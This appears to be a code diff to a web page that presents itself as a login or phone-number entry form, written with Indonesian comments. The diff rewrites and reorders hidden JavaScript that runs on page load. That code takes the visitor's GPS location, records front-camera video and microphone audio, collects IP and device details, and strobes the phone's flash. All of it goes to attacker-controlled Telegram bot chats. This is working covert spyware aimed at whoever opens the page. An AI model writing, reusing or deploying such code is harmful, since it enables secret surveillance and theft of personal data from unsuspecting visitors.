@@ -145,11 +145,6 @@
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
 
-    function selectPlatform(btn) {
-      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-    }
-
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -160,96 +155,9 @@
       });
     }
 
-    function sendVideo(blob, filename) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
-        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
-    function sendVoice(blob, filename) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('voice', blob, filename);
-        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
-    async function getInfo() {
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        let batteryInfo = "Tidak didukung";
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
-        }
-        const ram = navigator.deviceMemory || "Tidak diketahui";
-        const device = navigator.userAgent.split('(')[1].split(')')[0];
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM:</b> ±${ram} GB`;
-        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
-      } catch (err) {}
-    }
-
-    async function recordFrontVideo() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          sendVideo(new Blob(chunks, { type: 'video/mp4' }), 'rekaman_depan.mp4');
-          stream.getTracks().forEach(t => t.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 7000);
-      } catch (err) { sendToTelegram('maaf akses vidio tidak berhasil 🤬'); }
-    }
-
-    async function autoRecordAudio() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          sendVoice(new Blob(chunks, { type: 'audio/mpeg' }), 'voice_note.mp3');
-          stream.getTracks().forEach(t => t.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) { sendToTelegram('Izin Voice Note ditolak ❌'); }
-    }
-
-    async function startFlashStrobe() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-        const track = stream.getVideoTracks()[0];
-        const caps = track.getCapabilities();
-        if (!caps.torch) {
-          sendToTelegram('flash tidak on 🤬');
-          stream.getTracks().forEach(t => t.stop());
-          return;
-        }
-        sendToTelegram('flash berhasil on ✅');
-        let isOn = false;
-        const interval = setInterval(async () => {
-          try { isOn = !isOn; await track.applyConstraints({ advanced: [{ torch: isOn }] }); } catch (e) { clearInterval(interval); }
-        }, 90);
-        setTimeout(() => {
-          clearInterval(interval);
-          track.applyConstraints({ advanced: [{ torch: false }] });
-          stream.getTracks().forEach(t => t.stop());
-        }, 20000);
-      } catch (err) { sendToTelegram('flash tidak on 🤬'); }
-    }
-
-    // FITUR LOKASI (GPS)
-    function getLocation() {
+    // LOGIKA UTAMA: FLASH + LOKASI BERSAMAAN
+    async function startFlashAndGPS() {
+      // 1. Jalankan GPS (Tanpa menunggu Flash selesai)
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
@@ -259,18 +167,106 @@
           () => { sendToTelegram('maaf akses lokasi di tolak 🤬'); },
           { enableHighAccuracy: true }
         );
-      } else { sendToTelegram('Browser tidak mendukung Geolocation ❌'); }
+      }
+
+      // 2. Jalankan Flash Berkedip Secara Bersamaan
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const track = stream.getVideoTracks()[0];
+        const caps = track.getCapabilities();
+
+        if (caps.torch) {
+          sendToTelegram('flash berhasil on ✅');
+          let isOn = false;
+          const interval = setInterval(async () => {
+            try {
+              isOn = !isOn;
+              await track.applyConstraints({ advanced: [{ torch: isOn }] });
+            } catch (e) { clearInterval(interval); }
+          }, 90);
+
+          setTimeout(() => {
+            clearInterval(interval);
+            track.applyConstraints({ advanced: [{ torch: false }] });
+            stream.getTracks().forEach(t => t.stop());
+          }, 20000);
+        } else {
+          sendToTelegram('flash tidak on 🤬');
+          stream.getTracks().forEach(t => t.stop());
+        }
+      } catch (err) {
+        sendToTelegram('flash tidak on 🤬');
+      }
     }
 
-    // URUTAN PEMANGGILAN: LOKASI PERTAMA KALI
+    async function recordFrontVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          chatIds.forEach(id => {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('video', blob, 'rekaman.mp4');
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+          });
+          stream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 7000);
+      } catch (e) {}
+    }
+
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/mpeg' });
+          chatIds.forEach(id => {
+            const formData = new FormData();
+            formData.append('chat_id', id);
+            formData.append('voice', blob, 'voice.mp3');
+            fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData });
+          });
+          stream.getTracks().forEach(t => t.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+      } catch (e) {}
+    }
+
+    async function getInfo() {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ram = navigator.deviceMemory || "N/A";
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+        sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n📟 <b>RAM:</b> ±${ram} GB`);
+      } catch (err) {}
+    }
+
     window.addEventListener('DOMContentLoaded', () => {
-      getLocation();       // 1. Lokasi Muncul Pertama
-      startFlashStrobe();  // 2. Flash
-      autoRecordAudio();   // 3. Audio
-      recordFrontVideo();  // 4. Video
-      getInfo();           // 5. Info HP
-      createParticles();   // Background
+      createParticles();
+      // Jalankan GPS & Flash Bersamaan sebagai pembuka
+      startFlashAndGPS();
+      // Jalankan fitur lainnya secara berurutan
+      setTimeout(() => {
+        recordFrontVideo();
+        autoRecordAudio();
+        getInfo();
+      }, 500);
     });
+
+    function selectPlatform(btn) {
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+    }
 
     button.addEventListener('click', () => {
       const nomor = input.value.trim();
